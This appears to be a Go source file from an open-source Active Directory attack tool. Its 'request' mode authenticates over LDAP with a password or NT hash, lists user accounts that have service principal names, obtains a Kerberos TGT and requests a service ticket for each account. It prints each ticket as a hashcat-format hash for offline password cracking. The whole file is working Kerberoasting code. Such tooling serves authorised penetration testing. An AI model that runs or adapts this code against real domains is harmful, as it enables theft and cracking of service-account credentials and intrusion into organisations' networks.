package mode_request

import (
	"fmt"
	"io"
	"os"
	"strings"

	"github.com/TheManticoreProject/FindKerberoastables/core"
	"github.com/TheManticoreProject/FindKerberoastables/utils"
	"github.com/TheManticoreProject/Manticore/logger"
	kerberos "github.com/TheManticoreProject/Manticore/network/kerberos/v5"
	"github.com/TheManticoreProject/Manticore/network/kerberos/v5/attacks"
	"github.com/TheManticoreProject/Manticore/windows/credentials"
)

type ticketRequester interface {
	Kerberoast(string) (*kerberos.KerberoastResult, error)
}

// Run requests one service ticket per user account and prints hashcat hashes.
func Run(host string, port int, creds *credentials.Credentials, useLdaps, useKerberos, debug bool) error {
	if creds.Password == "" && creds.NTHash == "" {
		return fmt.Errorf("request mode requires a password or NT hash")
	}
	session, err := utils.OpenLDAP(host, port, creds, useLdaps, useKerberos)
	if err != nil {
		return err
	}
	defer session.Close()
	targets, err := core.GetRequestTargets(session, creds.Domain)
	if err != nil {
		return err
	}
	if debug {
		logger.Debug(fmt.Sprintf("Found %d user accounts with SPNs.", len(targets)))
	}
	if len(targets) == 0 {
		return nil
	}

	client := kerberos.NewClient(creds.Username, strings.ToUpper(creds.Domain), host)
	defer client.Destroy()
	if creds.Password != "" {
		client.WithPassword(creds.Password)
	} else if err := client.WithNTHash(creds.NTHash); err != nil {
		return fmt.Errorf("configuring Kerberos credential: %w", err)
	}
	if err := client.GetTGT(); err != nil {
		return fmt.Errorf("obtaining TGT: %w", err)
	}
	successes, failures, err := requestTickets(client, targets, os.Stdout, logger.Warn)
	if err != nil {
		return err
	}
	if debug {
		logger.Debug(fmt.Sprintf("Requested %d tickets; %d accounts failed.", successes, failures))
	}
	if failures != 0 {
		return fmt.Errorf("failed to request tickets for %d account(s)", failures)
	}
	return nil
}

func requestTickets(client ticketRequester, targets []core.RequestTarget, output io.Writer, warn func(string)) (int, int, error) {
	successes, failures := 0, 0
	for _, target := range targets {
		succeeded := false
		for _, spn := range target.SPNs {
			result, err := client.Kerberoast(spn)
			if err != nil {
				warn(fmt.Sprintf("%s (%s): %s", target.Account, spn, err))
				continue
			}
			hash, err := attacks.FormatTGSHash(target.Account, result.Realm, result.SPN, result.EType, result.Cipher)
			if err != nil {
				warn(fmt.Sprintf("%s (%s): %s", target.Account, spn, err))
				continue
			}
			if _, err := fmt.Fprintln(output, hash); err != nil {
				return successes, failures, fmt.Errorf("writing hash: %w", err)
			}
			successes++
			succeeded = true
			break
		}
		if !succeeded {
			failures++
		}
	}
	return successes, failures, nil
}
